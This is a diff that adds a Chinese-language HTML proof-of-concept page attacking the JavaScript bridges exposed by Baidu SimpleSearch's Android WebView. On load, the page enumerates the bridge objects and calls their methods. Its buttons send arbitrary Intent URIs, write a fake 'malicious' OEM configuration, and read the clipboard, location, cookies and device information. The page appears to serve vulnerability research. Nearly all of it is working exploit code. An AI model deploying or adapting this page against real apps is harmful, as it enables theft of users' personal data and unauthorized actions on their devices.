@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>简单搜索 JSB PoC — 安全验证</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: -apple-system, 'PingFang SC', sans-serif; background: #0d1117; color: #c9d1d9; padding: 12px; font-size: 14px; }
+  h1 { color: #f85149; font-size: 18px; margin-bottom: 4px; }
+  .subtitle { color: #8b949e; font-size: 12px; margin-bottom: 12px; }
+  .section { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 12px; margin-bottom: 10px; }
+  .section h2 { font-size: 14px; color: #58a6ff; margin-bottom: 8px; }
+  .section h3 { font-size: 13px; color: #d2a8ff; margin: 8px 0 4px; }
+  .item { padding: 6px 8px; margin: 3px 0; border-radius: 4px; font-size: 12px; word-break: break-all; }
+  .item.critical { background: #3d1111; border-left: 3px solid #f85149; }
+  .item.high { background: #3d1a11; border-left: 3px solid #f0883e; }
+  .item.medium { background: #3d2e11; border-left: 3px solid #d29922; }
+  .item.low { background: #1c2d1e; border-left: 3px solid #3fb950; }
+  .item.info { background: #0d1b2a; border-left: 3px solid #58a6ff; }
+  .fn-name { color: #f0883e; font-weight: bold; }
+  .fn-result { color: #7ee787; }
+  .fn-error { color: #f85149; }
+  .fn-skip { color: #8b949e; }
+  .key { color: #79c0ff; }
+  .val { color: #a5d6ff; }
+  .mono { font-family: 'SF Mono', 'Fira Code', monospace; font-size: 11px; }
+  .progress { height: 3px; background: #21262d; border-radius: 2px; margin: 8px 0; overflow: hidden; }
+  .progress-bar { height: 100%; background: linear-gradient(90deg, #58a6ff, #3fb950); width: 0%; transition: width 0.3s; border-radius: 2px; }
+  .summary { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 10px; }
+  .summary-item { flex: 1; min-width: 60px; text-align: center; padding: 8px 4px; border-radius: 6px; font-size: 12px; }
+  .summary-item .num { font-size: 22px; font-weight: bold; display: block; }
+  .tag { display: inline-block; padding: 1px 6px; border-radius: 3px; font-size: 10px; font-weight: bold; margin-right: 4px; }
+  .tag-critical { background: #f85149; color: #fff; }
+  .tag-high { background: #f0883e; color: #fff; }
+  .tag-medium { background: #d29922; color: #fff; }
+  .tag-low { background: #3fb950; color: #fff; }
+  .severity-bar { display: flex; gap: 2px; margin: 4px 0; }
+  .severity-bar .seg { height: 3px; flex: 1; border-radius: 1px; }
+  .btn { display: inline-block; padding: 6px 16px; border-radius: 6px; border: none; font-size: 13px; cursor: pointer; margin: 3px; }
+  .btn-danger { background: #f85149; color: #fff; }
+  .btn-warn { background: #d29922; color: #fff; }
+  .btn-info { background: #238636; color: #fff; }
+  .btn:disabled { opacity: 0.4; cursor: not-allowed; }
+  #intentUri { width: 100%; padding: 8px; border: 1px solid #30363d; border-radius: 4px; background: #0d1117; color: #c9d1d9; font-family: monospace; font-size: 11px; margin: 6px 0; }
+</style>
+</head>
+<body>
+
+<h1>🔴 简单搜索 JSB 攻击验证</h1>
+<p class="subtitle">Baidu SimpleSearch JavaScript Bridge — Security PoC</p>
+
+<div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="summary" id="summaryArea">
+  <div class="summary-item" style="background:#3d1111;"><span class="num" id="cntCritical">0</span>严重</div>
+  <div class="summary-item" style="background:#3d1a11;"><span class="num" id="cntHigh">0</span>高危</div>
+  <div class="summary-item" style="background:#3d2e11;"><span class="num" id="cntMedium">0</span>中危</div>
+  <div class="summary-item" style="background:#1c2d1e;"><span class="num" id="cntLow">0</span>低危</div>
+  <div class="summary-item" style="background:#0d1b2a;"><span class="num" id="cntInfo">0</span>信息</div>
+</div>
+
+<div id="results"></div>
+
+<script>
+const results = document.getElementById('results');
+const progressBar = document.getElementById('progressBar');
+
+let totalTests = 0;
+let passedTests = 0;
+let failedTests = 0;
+let skippedTests = 0;
+
+function updateSummary() {
+  document.getElementById('cntCritical').textContent = document.querySelectorAll('.item.critical').length;
+  document.getElementById('cntHigh').textContent = document.querySelectorAll('.item.high').length;
+  document.getElementById('cntMedium').textContent = document.querySelectorAll('.item.medium').length;
+  document.getElementById('cntLow').textContent = document.querySelectorAll('.item.low').length;
+  document.getElementById('cntInfo').textContent = document.querySelectorAll('.item.info').length;
+}
+
+function addItem(cssClass, title, content) {
+  const div = document.createElement('div');
+  div.className = 'item ' + cssClass;
+  div.innerHTML = '<strong>' + title + '</strong><br>' + content;
+  results.appendChild(div);
+  updateSummary();
+  totalTests++;
+}
+
+function addResult(name, status, detail, level) {
+  const cls = level || 'info';
+  const statusIcon = status === '✅' ? '<span class="fn-result">✅</span>' :
+                     status === '❌' ? '<span class="fn-error">❌</span>' :
+                     status === '⏭️' ? '<span class="fn-skip">⏭️</span>' : '';
+  addItem(cls, statusIcon + ' ' + name, '<span class="mono">' + (detail || '') + '</span>');
+  if (status === '✅') passedTests++;
+  else if (status === '❌') failedTests++;
+  else if (status === '⏭️') skippedTests++;
+}
+
+function updateProgress(value) {
+  progressBar.style.width = Math.min(value, 100) + '%';
+}
+
+// ============================================================
+// JSB Enumeration & Exploit
+// ============================================================
+
+async function runAllTests() {
+  updateProgress(5);
+  addItem('info', '🔍 开始枚举 JSB 对象...', '探测所有已注册的 JavaScript Bridge');
+
+  // ---- Step 1: Enumerate all known JSB objects ----
+  const knownJsbs = [
+    { name: 'Bdbox_android_send_intent', level: 'critical', desc: '任意 Intent 发送' },
+    { name: '_na', level: 'high', desc: '原生 API 桥' },
+    { name: 'Bdbox_android_utils', level: 'high', desc: '工具函数桥' },
+    { name: 'OemJSBridge', level: 'medium', desc: 'OEM 配置桥' },
+    { name: '_dove', level: 'low', desc: '性能监测桥' },
+    { name: 'Bdbox_android_jsbridge', level: 'medium', desc: 'Swan 全局桥' },
+    { name: 'Bdbox_aiapps_jsbridge', level: 'medium', desc: 'Swan AI 桥' },
+    { name: 'miniBridge', level: 'low', desc: 'Swan Card 桥' },
+    { name: '_naSwan', level: 'low', desc: 'Swan 原生桥' },
+    { name: 'go_back_js_interface_name', level: 'low', desc: '回退拦截桥' },
+    { name: '_WebViewJavascriptBridge', level: 'low', desc: '通用桥协议' },
+    { name: 'ReactNativeWebView', level: 'low', desc: 'RN 桥' },
+    { name: 'WebBridge', level: 'low', desc: 'YY 直播桥' },
+    { name: 'NativeCallback', level: 'low', desc: 'AR 回调桥' },
+    { name: 'jBenchmark', level: 'low', desc: 'V8 基准桥' },
+  ];
+
+  const foundJsbs = [];
+
+  for (const jsb of knownJsbs) {
+    try {
+      const obj = window[jsb.name];
+      if (typeof obj !== 'undefined' && obj !== null) {
+        foundJsbs.push(jsb);
+        addItem(jsb.level, '✅ 发现 JSB: <span class="fn-name">' + jsb.name + '</span>',
+          '<span class="tag tag-' + jsb.level + '">' + jsb.level.toUpperCase() + '</span> ' + jsb.desc);
+      } else {
+        addItem('info', '⏭️ JSB 未注册: <span class="fn-name">' + jsb.name + '</span>', jsb.desc);
+      }
+    } catch(e) {
+      addItem('low', '⏭️ 访问异常: <span class="fn-name">' + jsb.name + '</span>', e.message);
+    }
+  }
+
+  updateProgress(20);
+  addItem('info', `📊 发现 ${foundJsbs.length}/${knownJsbs.length} 个 JSB 对象`, '');
+
+  // ---- Step 2: Test found JSB methods ----
+  for (const jsb of foundJsbs) {
+    await testJsbMethods(jsb.name);
+  }
+
+  // ---- Step 3: Special attack tests ----
+  await runAttackTests(foundJsbs);
+
+  updateProgress(100);
+  addItem('low', '🏁 测试完成',
+    `总计: ${totalTests} | ✅ ${passedTests} | ❌ ${failedTests} | ⏭️ ${skippedTests}`);
+}
+
+// ============================================================
+// Test JSB methods
+// ============================================================
+async function testJsbMethods(jsbName) {
+  const obj = window[jsbName];
+
+  switch(jsbName) {
+    case 'Bdbox_android_send_intent':
+      // Only check existence, don't call send() without user intent
+      addItem('critical', '🛡️ ' + jsbName + '.send — 待用户触发',
+        '点击下方"执行攻击"按钮发送 Intent URI');
+      testMethod(jsbName, 'send', 'function', true);
+      break;
+
+    case '_na':
+      testMethod(jsbName, 'getAPIs', 'function', true);
+      if (typeof obj.getAPIs === 'function') {
+        try {
+          const apis = obj.getAPIs(1);
+          addItem('high', '📤 _na.getAPIs(1) 返回值',
+            '<span class="fn-result">' + escHtml(String(apis).substring(0, 200)) + '</span>');
+        } catch(e) {
+          addItem('high', '📤 _na.getAPIs(1) 异常', escHtml(e.message));
+        }
+      }
+      testMethod(jsbName, 'getAmendAPIs', 'function', true);
+      if (typeof obj.getAmendAPIs === 'function') {
+        try {
+          const amend = obj.getAmendAPIs();
+          addItem('high', '📤 _na.getAmendAPIs() 返回值',
+            '<span class="fn-result">' + escHtml(String(amend).substring(0, 200)) + '</span>');
+        } catch(e) {
+          addItem('high', '📤 _na.getAmendAPIs() 异常', escHtml(e.message));
+        }
+      }
+      break;
+
+    case 'OemJSBridge':
+      testMethod(jsbName, 'getPersonalizedConfig', 'function', true);
+      if (typeof obj.getPersonalizedConfig === 'function') {
+        try {
+          const config = obj.getPersonalizedConfig();
+          addItem('medium', '📤 OemJSBridge.getPersonalizedConfig()',
+            '<span class="fn-result">' + escHtml(String(config).substring(0, 500)) + '</span>');
+        } catch(e) {
+          addItem('medium', '📤 OemJSBridge.getPersonalizedConfig() 异常', escHtml(e.message));
+        }
+      }
+      testMethod(jsbName, 'setPersonalizedConfig', 'function', true);
+      break;
+
+    case 'Bdbox_android_utils':
+      // Try common utility method names
+      const utilMethods = ['getNetworkType', 'getAppInfo', 'getDeviceInfo', 'getClipboard',
+                           'getLocation', 'getCookie', 'getUA', 'getVersion'];
+      for (const m of utilMethods) {
+        const exists = testMethod(jsbName, m, 'function', false);
+        if (exists && typeof obj[m] === 'function') {
+          try {
+            const val = obj[m]();
+            const displayVal = typeof val === 'string' ? val : JSON.stringify(val);
+            addItem('high', '📤 ' + jsbName + '.' + m + '()',
+              '<span class="fn-result">' + escHtml(String(displayVal).substring(0, 200)) + '</span>');
+          } catch(e) {
+            // May need parameters, that's ok
+          }
+        }
+      }
+      break;
+
+    case '_dove':
+      testMethod(jsbName, 'recordWebLongTask', 'function', true);
+      break;
+
+    case 'miniBridge':
+    case '_naSwan':
+    case 'Bdbox_android_jsbridge':
+    case 'Bdbox_aiapps_jsbridge':
+      // Enumerate all methods on the object
+      const methodNames = [];
+      for (const key in obj) {
+        if (typeof obj[key] === 'function') methodNames.push(key);
+      }
+      if (methodNames.length > 0) {
+        addItem('medium', '📋 ' + jsbName + ' 暴露的方法 (' + methodNames.length + ' 个)',
+          '<span class="mono">' + methodNames.join(', ').substring(0, 300) + '</span>');
+      }
+      // Try to call each method with no args
+      for (const m of methodNames.slice(0, 5)) {
+        try {
+          const val = obj[m]();
+          addItem('medium', '📤 ' + jsbName + '.' + m + '()',
+            '<span class="fn-result">' + escHtml(String(val).substring(0, 100)) + '</span>');
+        } catch(e) { /* Expected for methods needing args */ }
+      }
+      break;
+
+    default:
+      // Generic enumeration
+      const allMethods = [];
+      for (const key in obj) {
+        if (typeof obj[key] === 'function') allMethods.push(key);
+      }
+      if (allMethods.length > 0) {
+        addItem('info', '📋 ' + jsbName + '.' + allMethods.join(', '), '');
+      }
+      break;
+  }
+}
+
+function testMethod(jsbName, methodName, expectedType, showResult) {
+  try {
+    const obj = window[jsbName];
+    const actualType = typeof obj[methodName];
+    if (actualType === expectedType) {
+      if (showResult) {
+        addItem('info', '✅ ' + jsbName + '.' + methodName + ' 存在 (' + actualType + ')', '');
+      }
+      return true;
+    } else {
+      if (showResult) {
+        addItem('info', '⏭️ ' + jsbName + '.' + methodName + ' 类型不匹配: 期望 ' + expectedType + ', 实际 ' + actualType, '');
+      }
+      return false;
+    }
+  } catch(e) {
+    if (showResult) {
+      addItem('info', '⏭️ ' + jsbName + '.' + methodName + ' 访问异常: ' + escHtml(e.message), '');
+    }
+    return false;
+  }
+}
+
+// ============================================================
+// Attack tests (require user confirmation for safety)
+// ============================================================
+async function runAttackTests(foundJsbs) {
+  const hasSendIntent = foundJsbs.some(j => j.name === 'Bdbox_android_send_intent');
+  const hasOem = foundJsbs.some(j => j.name === 'OemJSBridge');
+  const hasUtils = foundJsbs.some(j => j.name === 'Bdbox_android_utils');
+
+  // ---- Attack 1: Send arbitrary Intent ----
+  if (hasSendIntent) {
+    const attackSection = document.createElement('div');
+    attackSection.className = 'section';
+    attackSection.innerHTML = `
+      <h2>🚀 攻击测试: Bdbox_android_send_intent.send()</h2>
+      <p style="font-size:12px;color:#8b949e;margin-bottom:6px;">
+        此测试将尝试通过 JSB 发送 Intent URI。仅在理解后果后点击。
+      </p>
+      <label style="font-size:12px;color:#8b949e;">Intent URI:</label>
+      <input id="intentUri" value="intent:#Intent;action=android.intent.action.VIEW;end" />
+      <div>
+        <button class="btn btn-danger" onclick="attackSendIntent()">▶ 执行 send()</button>
+        <button class="btn btn-info" onclick="document.getElementById('intentUri').value='intent:#Intent;action=android.intent.action.VIEW;S.browser_fallback_url=https://www.baidu.com;end'">加载示例</button>
+      </div>
+      <div id="sendResult" style="margin-top:6px;font-size:12px;"></div>
+    `;
+    results.appendChild(attackSection);
+  }
+
+  // ---- Attack 2: OEM config overwrite ----
+  if (hasOem) {
+    const oemSection = document.createElement('div');
+    oemSection.className = 'section';
+    oemSection.innerHTML = `
+      <h2>🚀 攻击测试: OemJSBridge.setPersonalizedConfig()</h2>
+      <p style="font-size:12px;color:#8b949e;margin-bottom:6px;">
+        尝试写入任意 OEM 配置值。
+      </p>
+      <button class="btn btn-warn" onclick="attackOemConfig()">▶ 写入测试配置</button>
+      <div id="oemResult" style="margin-top:6px;font-size:12px;"></div>
+    `;
+    results.appendChild(oemSection);
+  }
+
+  // ---- Attack 3: Data exfiltration ----
+  if (hasUtils) {
+    const dataSection = document.createElement('div');
+    dataSection.className = 'section';
+    dataSection.innerHTML = `
+      <h2>🚀 攻击测试: 数据窃取 (Bdbox_android_utils)</h2>
+      <button class="btn btn-warn" onclick="attackDataExfil()">▶ 尝试窃取数据</button>
+      <div id="dataResult" style="margin-top:6px;font-size:12px;"></div>
+    `;
+    results.appendChild(dataSection);
+  }
+
+  // ---- Summary after all tests ----
+  updateProgress(90);
+}
+
+// ============================================================
+// Attack execution functions
+// ============================================================
+function attackSendIntent() {
+  const uri = document.getElementById('intentUri').value;
+  const resultDiv = document.getElementById('sendResult');
+  if (!uri) { resultDiv.innerHTML = '<span class="fn-error">❌ URI 为空</span>'; return; }
+
+  try {
+    if (typeof Bdbox_android_send_intent !== 'undefined' &&
+        typeof Bdbox_android_send_intent.send === 'function') {
+      Bdbox_android_send_intent.send(uri);
+      resultDiv.innerHTML = '<span class="fn-result">✅ send() 已调用，Intent URI: ' + escHtml(uri) + '</span>';
+      addItem('critical', '💥 攻击执行: sendIntent', escHtml(uri.substring(0, 100)));
+    } else {
+      resultDiv.innerHTML = '<span class="fn-error">❌ Bdbox_android_send_intent.send 不可用</span>';
+    }
+  } catch(e) {
+    resultDiv.innerHTML = '<span class="fn-error">❌ 异常: ' + escHtml(e.message) + '</span>';
+  }
+}
+
+function attackOemConfig() {
+  const resultDiv = document.getElementById('oemResult');
+  try {
+    if (typeof OemJSBridge !== 'undefined' &&
+        typeof OemJSBridge.setPersonalizedConfig === 'function') {
+      const payload = '{"poc_attack":"' + Date.now() + '","malicious":true}';
+      OemJSBridge.setPersonalizedConfig(payload);
+      resultDiv.innerHTML = '<span class="fn-result">✅ setPersonalizedConfig() 已调用: ' + escHtml(payload) + '</span>';
+      addItem('medium', '💥 攻击执行: setPersonalizedConfig', escHtml(payload));
+    } else {
+      resultDiv.innerHTML = '<span class="fn-error">❌ OemJSBridge.setPersonalizedConfig 不可用</span>';
+    }
+  } catch(e) {
+    resultDiv.innerHTML = '<span class="fn-error">❌ 异常: ' + escHtml(e.message) + '</span>';
+  }
+}
+
+async function attackDataExfil() {
+  const resultDiv = document.getElementById('dataResult');
+  const utils = window.Bdbox_android_utils;
+  if (!utils) { resultDiv.innerHTML = '<span class="fn-error">❌ Bdbox_android_utils 不可用</span>'; return; }
+
+  const results = [];
+  const dataMethods = ['getClipboard', 'getNetworkType', 'getAppInfo', 'getDeviceInfo', 'getUA', 'getLocation', 'getCookie'];
+
+  for (const m of dataMethods) {
+    if (typeof utils[m] === 'function') {
+      try {
+        const val = utils[m]();
+        const strVal = typeof val === 'object' ? JSON.stringify(val) : String(val);
+        results.push('<span class="key">' + m + '</span>: <span class="fn-result">' + escHtml(strVal.substring(0, 150)) + '</span>');
+      } catch(e) {
+        results.push('<span class="key">' + m + '</span>: <span class="fn-error">ERROR: ' + escHtml(e.message) + '</span>');
+      }
+    }
+  }
+
+  if (results.length > 0) {
+    resultDiv.innerHTML = results.join('<br>');
+    addItem('high', '💥 数据窃取结果', results.join('<br>'));
+  } else {
+    resultDiv.innerHTML = '<span class="fn-skip">⏭️ 没有可调用的数据方法</span>';
+  }
+}
+
+function escHtml(str) {
+  if (!str) return '';
+  return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+
+// ============================================================
+// Auto-start
+// ============================================================
+window.addEventListener('load', () => {
+  setTimeout(runAllTests, 300);
+});
+</script>
+</body>
+</html>
